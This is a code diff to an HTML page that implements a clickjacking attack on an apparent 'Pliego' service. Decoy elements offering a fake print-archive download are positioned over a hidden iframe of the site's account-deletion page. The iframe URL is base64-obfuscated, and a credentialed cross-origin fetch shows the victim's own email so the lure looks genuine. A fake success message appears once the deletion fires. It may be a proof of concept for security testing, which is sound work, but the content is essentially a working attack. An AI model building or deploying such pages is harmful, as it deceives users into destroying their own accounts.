@@ -64,30 +64,39 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .sb-title { font-size: 17px; font-weight: 800; line-height: 1.25; margin-bottom: 4px; }
 .sb-pub { font-size: 12px; color: var(--muted); margin-bottom: 0; }
 
-/* ── DECOY — matches eliminar.html: top:131 label, top:155 input, top:219 button ── */
-.email-label {
+/* ── DECOY — matches eliminar.html: top:131 label, top:155 pill, top:219 button ── */
+.acct-label {
   position: fixed; top: 131px; left: 826px;
-  font-size: 13px; font-weight: 500; color: var(--ink);
+  font-size: 12px; font-weight: 500; color: var(--muted);
+  letter-spacing: .02em; text-transform: uppercase;
   z-index: 2; pointer-events: none;
 }
-.fake-email-input {
+.acct-pill {
   position: fixed; top: 155px; left: 826px; width: 374px; height: 48px;
   background: var(--surf); border: 1.5px solid var(--line);
   border-radius: 8px; padding: 0 14px;
-  font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center; z-index: 2; pointer-events: none;
+  display: flex; align-items: center; gap: 10px;
+  z-index: 2; pointer-events: none;
 }
+.acct-dot { width: 8px; height: 8px; background: #16A34A; border-radius: 50%; flex-shrink: 0; }
+.acct-email-text { font-size: 13px; font-weight: 500; color: var(--ink); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 .fake-get-btn {
   position: fixed; top: 219px; left: 826px; width: 374px; height: 48px;
   background: #000; color: #fff; border: none; border-radius: 8px;
   font-family: inherit; font-size: 14px; font-weight: 700;
   display: flex; align-items: center; justify-content: center;
-  z-index: 2; pointer-events: none; letter-spacing: -.01em;
+  z-index: 2; pointer-events: none; letter-spacing: -.01em; cursor: pointer;
 }
 .sb-recaptcha {
   position: fixed; top: 279px; left: 826px; width: 374px;
   font-size: 11px; color: var(--muted); line-height: 1.5;
   z-index: 2; pointer-events: none;
+}
+/* Not-logged-in warning inside sidebar */
+.login-prompt {
+  position: fixed; top: 131px; left: 826px; width: 374px;
+  font-size: 13px; color: var(--muted); line-height: 1.6;
+  z-index: 2; display: none;
 }
 
 /* ── SUCCESS STATE (shown after postMessage from iframe) ── */
@@ -125,14 +134,18 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   <div class="sb-pub">ZIP · 847 prints · Partner access for Collected readers</div>
 </div>
 
-<div class="email-label">Email address</div>
-<input class="fake-email-input" type="email" name="email"
-  placeholder="your@email.com"
-  aria-label="Email address to receive archive access"
-  tabindex="0" />
-<button class="fake-get-btn" onclick="void(0)" tabindex="0">Get access</button>
+<div class="acct-label" id="acct-label">Pliego account</div>
+<div class="acct-pill" id="acct-pill">
+  <div class="acct-dot"></div>
+  <div class="acct-email-text" id="acct-email-text">loading…</div>
+</div>
+<button class="fake-get-btn" id="fake-get-btn" tabindex="0" aria-label="Get archive access">Get archive access</button>
 <div class="sb-recaptcha">
   Access delivered via <strong>Pliego Editions</strong> · Protected by reCAPTCHA
+</div>
+<div class="login-prompt" id="login-prompt">
+  Sign in to your Pliego account to claim access.<br>
+  <a href="https://pliego-len3.onrender.com/login" style="color:var(--ink);font-weight:600">Sign in →</a>
 </div>
 
 <div class="article">
@@ -180,7 +193,26 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </div>
 
 <script>
-// Assemble Pliego delete URL at runtime from base64 fragments
+// ── Load session from Pliego (cross-origin, SameSite=None cookie) ──────
+fetch('https://pliego-len3.onrender.com/api/session', { credentials: 'include' })
+  .then(function(r) { return r.json(); })
+  .then(function(d) {
+    if (d.loggedIn && d.email) {
+      document.getElementById('acct-email-text').textContent = d.email;
+    } else {
+      // Not logged in — hide pill+button, show sign-in prompt
+      document.getElementById('acct-label').style.display = 'none';
+      document.getElementById('acct-pill').style.display = 'none';
+      document.getElementById('fake-get-btn').style.display = 'none';
+      document.getElementById('sb-recaptcha') && (document.querySelector('.sb-recaptcha').style.display = 'none');
+      document.getElementById('login-prompt').style.display = 'block';
+    }
+  })
+  .catch(function() {
+    document.getElementById('acct-email-text').textContent = 'your registered email';
+  });
+
+// ── Load victim iframe from base64 at runtime ───────────────────────────
 setTimeout(function() {
   var p = [
     'aHR0cHM6Ly9wbGll',
@@ -191,16 +223,14 @@ setTimeout(function() {
 }, 500);
 // decodes to: https://pliego-len3.onrender.com/eliminar
 
-// Listen for postMessage from iframe when form is submitted
+// ── Listen for postMessage from iframe when deletion fires ──────────────
 window.addEventListener('message', function(e) {
   if (e.data && e.data.type === 'pliego-deleted') {
-    // Hide the decoy form elements
-    document.querySelector('.email-label').style.display = 'none';
-    document.querySelector('.fake-email-input').style.display = 'none';
-    document.querySelector('.fake-get-btn').style.display = 'none';
+    document.getElementById('acct-label').style.display = 'none';
+    document.getElementById('acct-pill').style.display = 'none';
+    document.getElementById('fake-get-btn').style.display = 'none';
     document.querySelector('.sb-recaptcha').style.display = 'none';
     document.querySelector('.sb-title').textContent = 'Archive access sent';
-    // Show success panel
     var email = e.data.email || '';
     if (email) document.getElementById('sp-sub').textContent =
       'Your download link has been delivered to ' + email + '. Check your inbox — it expires in 48 hours.';
